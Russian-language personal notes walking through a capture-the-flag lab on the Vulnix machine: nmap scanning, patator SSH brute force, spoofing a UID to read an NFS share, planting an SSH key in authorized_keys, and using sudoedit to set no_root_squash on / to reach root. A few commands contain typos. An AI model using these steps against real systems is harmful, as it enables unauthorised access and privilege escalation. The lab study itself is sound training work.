1. Сканирование сеть nmap 192.168.0.1/24 -sP для определение айпи адреса NIX
2. Запускаем nmap 192.168.0.23 -Pn -p- --open -sVC (не рекомендуется в начале сканирования):
``` bash
```
3. Для правильно работы необходимо изучить все найденные сервисы, записать и искать "низко висящие фрукты"(легкий способ доступа)
4.  Запускаем брутфорс ssh
``` bash
patator ssh_login host=192.168.0.23 user=/usr/share/seclists/Usernames/top-usernames-shortlist.txt  password=FILE0 0=Desktop/YAWR-master/brute/passwords/realyBest.txt -x ignore:mesg='Authentication failed.'

```
5. Получаем [[Задачи Cyber ED/Vuln - NIX/Пароли + логины|Пароли + логины]]
6. Заходим ssh
7. проверяем директорию 
8. забираем первый флаг
9. проверяем /etc/passwd
10. Видим другого пользователя vulnix с ID 2008
11. Проверяем /etc/exports (так как есть nfs(расшаренная папка)) чтобы найти расшаренные папки
12.  Выходим из ssh и логинимся под рутом в основной системе
13. Создаем пользователя vulnix с ID 2008
14. Создаем папку для монтирования расшаренной папки mkdir /tmp/share
15. Монтируем расшаренную папку к себе 
``` bash
mount -t nfs 192.168.0.23:/home/vulnix /tmp/share
umount -l /tmp/share) # размонтировать директорию 
```
16. заходим под пользователем vulnix - su vulnix
17. В папке share прописываем ls и забираем второй флаг
18. Заходим обратно под рут и создаем rsa ключ ssh 
```
ssh-keygen -t rsa
```
19. Копируем публичный ключ (.pub)
20. заходим под vulnix (su vulnix)
21. создаем директорию share/.ssh && cd .ssh
22. копируем ключ 
```
cat ~/.ssh/id_rsa.pub >> /tmp/share/root/.ssh/authorized_keys
echo 'key' > .ssh/authorized_keys
```
21.  Заходим по ssh под пользователем vulnix
```
ssh vulnix@192.168.0.23 -o 'PubkeyAcceptedKeyTypes +ssh-rsa'
```
22. прописываем sudo -l
23.  видим что можно использовать sudoedit /etc/exports
24. прописываем / *(rm, no_root_squash)
25. сохраняем файл и перезапускаем систему
26. создаем новую папку /tmp/shr и монтриуем в нее /
27. заходим в рут и берем последний флаг 